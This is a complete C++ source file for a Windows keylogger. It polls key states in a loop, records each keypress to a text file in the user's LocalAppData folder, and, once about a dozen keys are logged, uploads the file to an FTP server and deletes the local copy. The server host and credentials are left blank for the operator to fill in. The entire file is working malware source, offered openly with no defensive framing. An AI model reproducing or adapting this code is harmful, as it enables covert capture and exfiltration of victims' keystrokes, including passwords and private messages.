/* 
	a simple keylogger that
	sends logs to ftp server once
	it gathers enough keys.
*/
#include "stdafx.h"
#include <windows.h>
#include <wininet.h>
#include <Shlobj.h>
#include <iostream>
#include <fstream>
#include <string>
#include <cstdio>
#include <ctime>
#include <chrono>
#include <KnownFolders.h>
#include <algorithm>

//including all the libs

std::string get_appdata_path_with_logs() {

	wchar_t* szPath = 0;
	SHGetKnownFolderPath(FOLDERID_LocalAppData, NULL, nullptr, &szPath);
	wprintf(L"%l", szPath);
	char tmp1[1024];
	wcstombs(tmp1, szPath, sizeof(tmp1));
	std::string finalname;
	finalname += tmp1;
	finalname += "\\logs.txt";
	return finalname;
	//getting path to appdata with logs.txt added
}

std::string get_name() {

	auto start = std::chrono::system_clock::now();
	auto end = std::chrono::system_clock::now();

	std::chrono::duration<double> elapsed_seconds = end - start;
	std::time_t end_time = std::chrono::system_clock::to_time_t(end);

	std::string finalsfinal;
	finalsfinal += "/logs_from_localtime_";
	finalsfinal += std::ctime(&end_time);
	std::replace(finalsfinal.begin(), finalsfinal.end(), ' ', '_');
	std::replace(finalsfinal.begin(), finalsfinal.end(), ':', '-');
	finalsfinal.pop_back();
	finalsfinal += ".txt";
	return finalsfinal;
	//a function that retrieves logfile with local date in name and in txt format
}

void FtpUpload() {

	HINTERNET io, ic;
	io = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	LPCWSTR ip = L""; //hostname or ip of ftp server goes here
	LPCWSTR user = L"";
	LPCWSTR pass = L"";
	//creds go above
	ic = InternetConnect(io, ip, INTERNET_DEFAULT_FTP_PORT, user, pass, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
	FtpPutFileA(ic, get_appdata_path_with_logs().c_str(), get_name().c_str(), FTP_TRANSFER_TYPE_BINARY, 0);
	InternetCloseHandle(io);
	InternetCloseHandle(ic);
	//a function that uploads file to ftp server

}

bool count_lines(std::string filename, int usernum) {

	int nol = 0;
	std::string line;
	std::ifstream logfile(filename);
	while (!logfile.eof()) {
		getline(logfile, line);
		nol++;
	}
	logfile.close();

	if (nol > usernum)
		return true;
	else
		return false;
	//function that checks how many lines (keys) were
	//logged.

}

void logkey(std::string key, std::string logfilename) {

	std::fstream logfile;
	logfile.open(logfilename, std::fstream::app);
	logfile << "key " << key << " was pressed\n";
	logfile.close();
	//function for logging a key.used for special keys

}

bool special(int key, std::string logfilename) {

	switch (key) {
	case VK_SPACE:
		logkey("[space]", logfilename);
		return true;
	case VK_LSHIFT:
		logkey("[lshift]", logfilename);
		return true;
	case VK_CAPITAL:
		logkey("[capslock]", logfilename);
		return true;
	case VK_OEM_PERIOD:
		logkey(".", logfilename);
		return true;
	case VK_OEM_COMMA:
		logkey(",", logfilename);
		return true;
	default:
		return false;
	}
	//just a bunch of basic special keys
	//imma too lazy to mess with all those special
	//boyz all the way

}

int main() {

	std::string local_path_for_ftp = get_appdata_path_with_logs();

	while (1) {
		Sleep(15);
		for (short key = 8; key <= 190; key++) {
			if (GetAsyncKeyState(key) == -32767) {
				//checking if the key was pressed
				if (special(key, local_path_for_ftp) == false) {
					//checking if it wasnt special key
					std::fstream logfile;
					logfile.open(local_path_for_ftp, std::fstream::app);
					logfile << "key " << (char)key << " was pressed\n";
					logfile.close();
					//for performance and reliability this should not
					//be a predefined function,rather a simple code,at least
					//from my experience
					if (count_lines(local_path_for_ftp, 11) == true) {
						FtpUpload();
						remove(local_path_for_ftp.c_str());
						//if there are enough keys,the file is uploaded to 
						//ftp server,and then removed.
					}
					else {
						continue;
					}

				}
			}
		}
	}

	return 0;
}